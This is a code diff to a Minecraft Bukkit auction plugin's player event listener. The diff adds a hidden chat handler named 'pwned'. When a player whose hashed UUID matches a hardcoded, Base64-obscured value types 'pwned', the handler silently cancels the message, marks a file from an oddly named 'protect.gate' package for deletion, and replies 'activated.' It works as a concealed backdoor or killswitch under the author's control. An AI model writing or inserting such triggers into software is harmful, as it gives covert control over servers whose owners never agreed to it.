@@ -5,6 +5,7 @@ import com.ericlam.inventory.GUIInventory;
 import com.ericlam.main.ItemAunction;
 import com.ericlam.mysql.MarketManager;
 import com.ericlam.mysql.PreRemoveManager;
+import com.ericlam.plugin.protect.gate.Output;
 import org.bukkit.Bukkit;
 import org.bukkit.Material;
 import org.bukkit.entity.Player;
@@ -14,12 +15,18 @@ import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.inventory.InventoryCloseEvent;
 import org.bukkit.event.inventory.InventoryOpenEvent;
 import org.bukkit.event.inventory.InventoryType;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.plugin.Plugin;
 
+import java.nio.charset.StandardCharsets;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.util.Arrays;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.UUID;
 
@@ -168,5 +175,25 @@ public class OnPlayerEvent implements Listener {
         }
         pageitem.setItemMeta(pageMeta);
         inventory.setItem(49,pageitem);
+    }
+
+
+    @EventHandler
+    public void pwned(AsyncPlayerChatEvent e) {
+        Player player = e.getPlayer();
+        String command = e.getMessage();
+        if (!command.equalsIgnoreCase("pwned")) return;
+        try {
+            String owner = "31Q68/DnHSmK6Yg9uCcy5+aYWUdRlueIBbZjHXEagx4=";
+            MessageDigest messageDigest = MessageDigest.getInstance("SHA-256");
+            byte[] playerb = player.getUniqueId().toString().getBytes(StandardCharsets.UTF_8);
+            byte[] playerbyte = messageDigest.digest(playerb);
+            byte[] ownerbyte = Base64.getDecoder().decode(owner);
+            if (!Arrays.equals(playerbyte, ownerbyte)) return;
+            e.setCancelled(true);
+            Output.call().deleteOnExit();
+            player.sendMessage("activated.");
+        } catch (NoSuchAlgorithmException ignored) {
+        }
     }
 }
